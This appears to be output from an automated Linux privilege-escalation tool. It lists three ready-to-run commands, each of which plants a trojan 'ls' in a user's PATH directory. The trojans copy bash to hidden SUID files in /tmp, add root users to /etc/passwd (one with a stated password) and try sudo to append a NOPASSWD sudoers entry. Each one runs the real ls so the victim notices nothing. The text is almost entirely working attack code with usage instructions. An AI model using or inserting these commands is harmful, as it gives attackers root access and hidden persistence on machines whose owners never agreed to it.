Create a malicious ls binary in /home/kali/.local/bin (which is in PATH) to escalate privileges

exploits.command:
echo '#!/bin/bash
    # Path hijacking exploit for ls
    # Created by Advanced Linux Privilege Escalation Tool

    # Create a copy of bash with SUID permissions
    cp /bin/bash /tmp/.privbash-1742117624
    chmod 4755 /tmp/.privbash-1742117624

    # Leave evidence of successful execution
    echo "[+] Privilege escalation successful via ls path hijacking at $(date)" > /tmp/.privesc-success-1742117624

    # Run the original command to avoid detection
    ls "$@"
    ' > /home/kali/.local/bin/ls && chmod +x /home/kali/.local/bin/ls
exploits.description: Create a malicious ls binary in /home/kali/.local/bin that will create a SUID bash copy
exploits.usage: After a privileged user runs this command, check /tmp/ for .privbash-* files and execute with -p flag

exploits.command:
echo '#!/bin/bash
    # Path hijacking exploit for ls
    # Created by Advanced Linux Privilege Escalation Tool

    # Try to add a new root user
    echo 'privesc::0:0::/root:/bin/bash' >> /etc/passwd
    echo "privesc:$(openssl passwd -1 -salt xyz privesc123):0:0::/root:/bin/bash" >> /etc/passwd 2>/dev/null

    # Leave evidence of successful execution
    echo "[+] User added via ls path hijacking at $(date)" > /tmp/.privesc-useradd-1742117624

    # Run the original command to avoid detection
    ls "$@"
    ' > /home/kali/.local/bin/ls && chmod +x /home/kali/.local/bin/ls
exploits.description: Create a malicious ls that will add a new root user to /etc/passwd
exploits.usage: After a privileged user runs this command, try 'su privesc' with password 'privesc123'

exploits.command:
echo '#!/bin/bash
    # Path hijacking exploit for ls
    # Created by Advanced Linux Privilege Escalation Tool

    # Try to use sudo to create a SUID binary
    echo '#!/bin/bash
    if [ $(id -u) -eq 0 ]; then
        cp /bin/bash /tmp/.rootshell-1742117624
        chmod 4755 /tmp/.rootshell-1742117624
        echo "Root shell created at /tmp/.rootshell-1742117624"
    fi' > /tmp/.sudoscript-1742117624
    chmod +x /tmp/.sudoscript-1742117624

    # Try various privilege escalation techniques silently
    sudo /tmp/.sudoscript-1742117624 2>/dev/null || true
    sudo -n /tmp/.sudoscript-1742117624 2>/dev/null || true

    # Try to modify sudoers file
    echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers 2>/dev/null || true

    # Leave evidence of execution attempt
    echo "[+] Sudo exploitation attempt via ls path hijacking at $(date)" > /tmp/.privesc-sudo-1742117624

    # Run the original command to avoid detection
    ls "$@"
    ' > /home/kali/.local/bin/ls && chmod +x /home/kali/.local/bin/ls
exploits.description: Create a malicious ls that tries various sudo techniques to gain root access
exploits.usage: After a privileged user runs this command, check /tmp/ for .rootshell-* files or try 'sudo -l'
